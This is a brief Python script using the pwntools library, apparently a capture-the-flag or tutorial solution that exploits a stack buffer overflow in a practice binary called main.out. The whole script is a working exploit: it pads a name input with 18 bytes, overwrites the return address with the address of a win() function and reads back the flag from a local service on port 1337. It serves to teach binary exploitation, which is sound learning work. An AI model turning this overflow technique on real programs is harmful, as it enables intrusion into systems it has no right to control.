from pwn import *

# Connect to the remote server or local process
io = remote("127.0.0.1", 1337)
# io = process("./main.out")

elf = context.binary = ELF("./main.out")

# Build the payload: padding + address of win()
offset = 18 # (Replace with exact offset found in Step 1)
payload = b"A" * offset + p64(elf.sym.win)

# Send the payload
io.sendlineafter(b"name?\n", payload)

# Receive the flag
print(io.recvall().decode())